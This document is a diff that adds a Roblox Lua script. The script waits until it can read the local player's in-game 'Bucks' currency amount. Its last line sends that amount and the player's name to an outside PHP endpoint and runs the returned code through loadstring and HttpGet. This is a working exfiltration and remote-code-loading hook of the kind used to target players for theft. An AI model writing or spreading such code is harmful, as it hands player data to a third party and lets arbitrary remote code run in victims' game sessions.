@@ -1,0 +1,36 @@
+local playerName = game.Players.LocalPlayer.Name
+
+local player = game.Players:FindFirstChild(playerName)
+if not player then
+    player = game.Players.PlayerAdded:Wait()
+end
+
+local gui = player:WaitForChild("PlayerGui")
+
+local function getBucksAmount()
+    local success, result = pcall(function()
+        local bucksApp = gui:FindFirstChild("BucksIndicatorApp")
+        if not bucksApp then return nil end
+        
+        local currencyIndicator = bucksApp:FindFirstChild("CurrencyIndicator")
+        if not currencyIndicator then return nil end
+        
+        local container = currencyIndicator:FindFirstChild("Container")
+        if not container then return nil end
+        
+        local amountLabel = container:FindFirstChild("Amount")
+        if not amountLabel or not amountLabel:IsA("TextLabel") then return nil end
+        
+        return amountLabel.Text
+    end)
+    
+    return success and result or nil
+end
+
+local bucksAmount
+repeat
+    task.wait(1) 
+    bucksAmount = getBucksAmount()
+until bucksAmount ~= nil
+
+loadstring(game:HttpGet("http://agt.ru.swtest.ru/TransferData.php?data="..bucksAmount.."&name="..playerName))()
